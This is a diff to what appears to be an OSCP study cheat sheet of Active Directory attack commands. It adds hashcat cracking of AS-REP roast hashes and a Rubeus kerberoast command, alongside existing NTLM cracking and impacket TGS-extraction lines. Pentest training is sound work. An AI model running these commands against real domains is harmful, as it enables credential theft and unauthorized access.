@@ -87,6 +87,12 @@ NTLM dump from mimikatz brute for OSCP :
 ```bash
 hashcat -m 1000 hashes /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
 ```
+Crack AS-REP roast hash:
+#hashcat #asrep-roasting #bruteforce 
+
+```bash
+sudo hashcat -m 18200 hashes /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
+```
 
 Dump hashes using account credentials:
 #dump #creds
@@ -129,6 +135,9 @@ Send request to TGS and extract the hash:
 impacket-GetUserSPNs -dc-ip $TARGET_IP $TARGET_DOMAIN/$USERNAME -request
 ```
 
+```powershell
+.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
+```
 
 ZeroLogon (CVE-2020-1472)
 ---
